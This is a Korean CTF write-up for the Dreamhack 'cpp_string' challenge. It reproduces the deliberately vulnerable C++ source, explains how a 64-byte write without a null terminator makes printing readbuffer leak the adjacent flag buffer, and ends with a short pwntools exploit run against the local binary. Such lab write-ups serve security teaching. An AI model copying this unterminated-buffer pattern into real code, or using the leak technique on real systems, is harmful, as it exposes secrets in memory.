# cpp_string

[문제 링크](https://dreamhack.io/wargame/challenges/64)

## 소스 코드

```
Ubuntu 16.04 LTS
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

```cpp
//g++ -o cpp_string cpp_string.cpp
#include <iostream>
#include <fstream>
#include <csignal>
#include <unistd.h>
#include <stdlib.h>

char readbuffer[64] = {0, };
char flag[64] = {0, };
std::string writebuffer;

void alarm_handler(int trash)
{
    std::cout << "TIME OUT" << std::endl;
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int read_file(){
	std::ifstream is ("test", std::ifstream::binary);
	if(is.is_open()){
        	is.read(readbuffer, sizeof(readbuffer));
		is.close();

		std::cout << "Read complete!" << std::endl;
        	return 0;
	}
	else{
        	std::cout << "No testfile...exiting.." << std::endl;
        	exit(0);
	}
}

int write_file(){
	std::ofstream of ("test", std::ifstream::binary);
	if(of.is_open()){
		std::cout << "Enter file contents : ";
        	std::cin >> writebuffer;
		of.write(writebuffer.c_str(), sizeof(readbuffer));
                of.close();
		std::cout << "Write complete!" << std::endl;
        	return 0;
	}
	else{
		std::cout << "Open error!" << std::endl;
		exit(0);
	}
}

int read_flag(){
        std::ifstream is ("flag", std::ifstream::binary);
        if(is.is_open()){
                is.read(flag, sizeof(readbuffer));
                is.close();
                return 0;
        }
        else{
		std::cout << "You must need flagfile.." << std::endl;
                exit(0);
        }
}

int show_contents(){
	std::cout << "contents : ";
	std::cout << readbuffer << std::endl;
	return 0;
}
	


int main(void) {
    initialize();
    int selector = 0;
    while(1){
    	std::cout << "Simple file system" << std::endl;
    	std::cout << "1. read file" << std::endl;
    	std::cout << "2. write file" << std::endl;
	std::cout << "3. show contents" << std::endl;
    	std::cout << "4. quit" << std::endl;
    	std::cout << "[*] input : ";
	std::cin >> selector;
	
	switch(selector){
		case 1:
			read_flag();
			read_file();
			break;
		case 2:
			write_file();
			break;
		case 3:
			show_contents();
			break;
		case 4:
			std::cout << "BYEBYE" << std::endl;
			exit(0);
	}
    }
}
```

## 취약점 분석

### 연속된 메모리 할당

코드 상단을 보면 전역 변수로 readbuffer와 flag가 각각 64바이트 크기로 나란히 선언되어 있습니다.

```cpp
char readbuffer[64] = {0, };
char flag[64] = {0, };
```

일반적으로 컴파일러는 이 변수들을 .bss 데이터 영역에 선언된 순서대로 연속해서 배치합니다. 즉, readbuffer의 64바이트가 끝나는 지점 바로 다음에 flag가 위치하게 됩니다.

### 널 종료 문자(Null Terminator) 누락

write_file() 함수에서 사용자의 입력을 받아 파일에 쓸 때, 다음과 같이 sizeof(readbuffer) 즉 64바이트를 고정으로 파일(test)에 씁니다.

```cpp
of.write(writebuffer.c_str(), sizeof(readbuffer)); // 무조건 64바이트 쓰기
```

만약 사용자가 64글자 이상의 문자열(예: "A" * 64)을 입력하면, 파일에는 널 종료 문자(\0) 없이 온전히 문자 64개만 기록됩니다.

이후 read_file() 함수에서 다시 test 파일을 읽어 readbuffer에 담습니다.

```cpp
is.read(readbuffer, sizeof(readbuffer));
```

`std::ifstream::read()` 함수는 지정한 크기만큼 바이트를 읽어올 뿐, 끝에 널 바이트를 추가해 주지 않습니다. 결국 `readbuffer`는 널 문자 없이 64바이트 문자로 꽉 차게 됩니다.

### Out-of-Bounds (OOB) 출력

`show_contents()` 함수는 `std::cout << readbuffer << std::endl;` 구문을 통해 문자열을 출력합니다. `std::cout`은 문자열을 출력할 때 널 바이트를 만날 때까지 메모리를 계속 읽어 나갑니다.

`readbuffer`에 널 바이트가 없으므로 64바이트를 모두 출력한 후, **바로 뒤에 위치한 `flag` 메모리 영역까지 침범하여 플래그 문자열을 화면에 노출(Leak)**하게 됩니다.


## 익스플로잇

```python
from pwn import *

def exploit():
    p = process('./cpp_string')

    payload = b"A" * 64
    p.sendlineafter(b"[*] input : ", b"2")
    p.sendlineafter(b"Enter file contents : ", payload)


    p.sendlineafter(b"[*] input : ", b"1")

    p.sendlineafter(b"[*] input : ", b"3")

    p.recvuntil(b"contents : ")
    leaked_data = p.recvline().strip()

    flag = leaked_data[64:].decode(errors='ignore')
    log.success(f"Flag: {flag}")

if __name__ == "__main__":
    exploit()
```